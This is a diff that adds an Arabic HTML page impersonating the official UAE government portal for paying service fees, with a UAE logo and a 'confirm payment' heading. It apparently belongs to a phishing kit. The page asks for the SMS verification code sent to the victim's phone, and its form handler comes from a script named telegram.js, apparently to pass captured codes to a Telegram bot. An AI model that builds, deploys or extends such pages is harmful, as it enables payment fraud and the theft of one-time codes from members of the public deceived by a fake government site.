@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>القنوات الذكية لتسديد رسوم الخدمات الحكومية | البوابة الرسمية لحكومة الإمارات العربية المتحدة</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <style>
+        body {
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .otp-container {
+            max-width: 500px;
+            width: 100%;
+            background-color: #1a3a5c;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .otp-header {
+            padding: 25px;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+        }
+        .otp-header img {
+            height: 50px;
+        }
+        .otp-header .uae-text {
+            color: #fff;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .otp-content {
+            background-color: #f5f5f5;
+            padding: 30px;
+        }
+        .otp-title {
+            text-align: center;
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 25px;
+        }
+        .otp-subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        .otp-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px dashed #f5a623;
+            border-radius: 5px;
+            font-size: 20px;
+            text-align: center;
+            margin-bottom: 15px;
+            background-color: #fff;
+            letter-spacing: 5px;
+        }
+        .otp-input:focus {
+            outline: none;
+            border-color: #006633;
+        }
+        .resend-text {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .resend-text span {
+            color: #f5a623;
+        }
+        .btn-confirm {
+            width: 100%;
+            padding: 15px;
+            background-color: #00e5ff;
+            color: #333;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-confirm:hover {
+            background-color: #00c8e0;
+            transform: scale(1.02);
+        }
+        .otp-footer {
+            background-color: #1a3a5c;
+            padding: 15px;
+            text-align: center;
+            color: #fff;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="otp-container">
+        <div class="otp-header">
+            <img src="image/Emarats.png" alt="شعار الإمارات">
+            <span class="uae-text">UAE</span>
+        </div>
+        
+        <div class="otp-content">
+            <h2 class="otp-title">يرجى تأكيد الدفع</h2>
+            
+            <p class="otp-subtitle">يرجى إدخال رمز التحقق المرسل إلى هاتفك</p>
+            
+            <form id="otpForm" onsubmit="handleOTPForm(event)">
+                <input type="text" id="otp" name="otp" class="otp-input" maxlength="6" placeholder="------" required>
+                
+                <p class="resend-text">يمكنك طلب رمز جديد خلال : <span id="countdown">60</span></p>
+                
+                <button type="submit" class="btn-confirm">تأكيد</button>
+            </form>
+        </div>
+        
+        <div class="otp-footer">
+            2025 © - all rights reserved
+        </div>
+    </div>
+    
+    <script src="../js/telegram.js"></script>
+    <script>
+        // Countdown timer
+        let timeLeft = 60;
+        const countdownEl = document.getElementById('countdown');
+        
+        const timer = setInterval(() => {
+            timeLeft--;
+            countdownEl.textContent = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                countdownEl.textContent = 'يمكنك إعادة الإرسال الآن';
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
